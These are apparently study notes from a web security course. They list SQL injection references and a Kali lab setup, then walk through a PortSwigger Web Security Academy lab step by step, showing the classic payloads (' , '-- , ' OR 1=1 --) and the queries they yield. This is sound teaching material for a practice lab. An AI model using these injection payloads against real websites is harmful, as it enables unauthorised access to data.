# Automated Exploitation Tools

```
    ___
   __H__
 ___ ___[']_____ ___ ___  {1.7.2}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

```

- **Web Application Hacker's Handbook**    
Chapter 9 - Attacking Data Stores

- **Web Security Academy**  
[https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

- **OWASP SQL Injection**   
[https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

- **OWASP SQL Injection Prevention Cheat Sheet**  
[https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

- **Pentest Monkey**  
[https://pentestmonkey.net/category/cheat-sheet/sql-injection](https://pentestmonkey.net/category/cheat-sheet/sql-injection)

- **Web Application Vulnerability Scanners** (WAVS)
(black-box):
Arachni, Wapiti, Acunetix, W3af.

# Instructor's Lab Setup

- Kali Linux running in VMWare inside macOS. In Kali Linux:

    - Burp Suite Community Edition (Pre-installed in Kali).
    - Visual Studio Code (free installation).
    - FoxyProxy Firefox extension (free installation).
    - The labs are on **Web Security Academy**.

## Burp Suite Community Edition

Proxy tab > Open Browser (built-in).

### Lab 1. SQLi Vulnerability in WHERE clause allowing retrieval of hidden data

- Product category filter

```sql
SELECT * FROM products WHERE category = 'Gifts'
AND released = 1;
```

End goal: display all products both released and unreleased.

Payload: `web-security-academy.net/filter?category=Gifts`

### Submit various payloads and watch the behavior:

1. ?category= `'`

```sql
SELECT * FROM products WHERE category = ''' AND released = 1
-- Internal Server Error. This may indicate a SQL injection vulnerability
```

2. ?category= `'--`

```sql
SELECT * FROM products WHERE category = ''--' AND released = 1 ---> No web page error, good sign.
```

3. ?category= `' OR 1=1 --`  
The first single quote (') acts as the closing quote in the
SQL statement, whereas the `--` cancels out the
`released = 1` validation-

```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1 
```

SUCCESS!